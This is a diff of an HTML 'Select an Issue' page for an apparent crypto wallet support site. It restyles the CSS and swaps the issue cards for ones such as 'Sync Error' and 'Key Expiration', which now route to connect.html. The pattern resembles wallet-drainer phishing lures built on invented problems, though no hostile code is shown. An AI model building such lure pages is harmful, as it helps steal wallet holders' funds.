@@ -5,36 +5,71 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Select Issue</title>
     <style>
-        body { margin: 0; background-color: #000; color: white; font-family: system-ui, -apple-system, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; }
+        body { 
+            margin: 0; 
+            background-color: #000; 
+            color: white; 
+            font-family: system-ui, -apple-system, sans-serif; 
+            padding: 20px; 
+            max-width: 600px; 
+            margin: 0 auto; 
+        }
         h1 { font-size: 24px; text-align: center; margin-bottom: 30px; }
-        .issue-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; transition: all 0.2s; }
-        .issue-card:hover { background: #222; border-color: #555; }
-        .issue-title { font-weight: bold; font-size: 16px; margin-bottom: 5px; }
-        .issue-desc { color: gray; font-size: 13px; }
-        .back-btn { display: block; text-align: center; margin-top: 20px; color: #2563eb; text-decoration: none; }
+        
+        .issue-card { 
+            background: #111; 
+            border: 1px solid #333; 
+            border-radius: 12px; 
+            padding: 20px; 
+            margin-bottom: 15px; 
+            cursor: pointer; 
+            transition: all 0.2s;
+        }
+        .issue-card:hover { 
+            border-color: #2563eb; 
+            background: #1a1a1a; 
+        }
+        .issue-title { font-weight: bold; font-size: 18px; margin-bottom: 5px; }
+        .issue-desc { color: #aaa; font-size: 14px; line-height: 1.4; }
+        
+        .back-link { display: block; text-align: center; margin-top: 20px; color: #2563eb; text-decoration: none; }
     </style>
 </head>
 <body>
     <h1>Select an Issue</h1>
-    
-    <!-- Issue 1 -->
-    <div class="issue-card" onclick="window.location.href='resolution.html?type=locked'">
+
+    <!-- Card 1: Wallet Locked -->
+    <div class="issue-card" onclick="window.location.href='connect.html?type=locked'">
         <div class="issue-title">Wallet Access Locked</div>
-        <div class="issue-desc">Unable to unlock your wallet due to failed biometric or password attempts.</div>
+        <div class="issue-desc">Unable to sign transactions or view balance.</div>
     </div>
 
-    <!-- Issue 2 -->
-    <div class="issue-card" onclick="window.location.href='resolution.html?type=pending'">
-        <div class="issue-title">Transaction Pending</div>
-        <div class="issue-desc">Your funds are stuck in the mempool or awaiting confirmation.</div>
+    <!-- Card 2: Sync Error -->
+    <div class="issue-card" onclick="window.location.href='connect.html?type=sync'">
+        <div class="issue-title">Sync Error</div>
+        <div class="issue-desc">Blockchain data is out of sync with the network.</div>
     </div>
 
-    <!-- Issue 3 -->
-    <div class="issue-card" onclick="window.location.href='resolution.html?type=recovery'">
-        <div class="issue-title">Seed Phrase Recovery</div>
-        <div class="issue-desc">Lost or damaged hardware wallet requiring protocol-level recovery.</div>
+    <!-- Card 3: Transaction Failed -->
+    <div class="issue-card" onclick="window.location.href='connect.html?type=tx'">
+        <div class="issue-title">Transaction Failed</div>
+        <div class="issue-desc">Transactions stuck in pending or failed state.</div>
     </div>
 
-    <a href="index.html" class="back-btn">← Back to Home</a>
+    <!-- Card 4: Key Expired -->
+    <div class="issue-card" onclick="window.location.href='connect.html?type=key'">
+        <div class="issue-title">Key Expiration</div>
+        <div class="issue-desc">Security keys have expired or been revoked.</div>
+    </div>
+
+    <a href="index.html" class="back-link">← Back to Home</a>
+
+    <script>
+        // Optional: If connect.html wants to know which issue was selected,
+        // this script ensures the URL parameter is preserved.
+        const urlParams = new URLSearchParams(window.location.search);
+        const type = urlParams.get('type');
+        console.log("Selected issue type:", type);
+    </script>
 </body>
 </html>
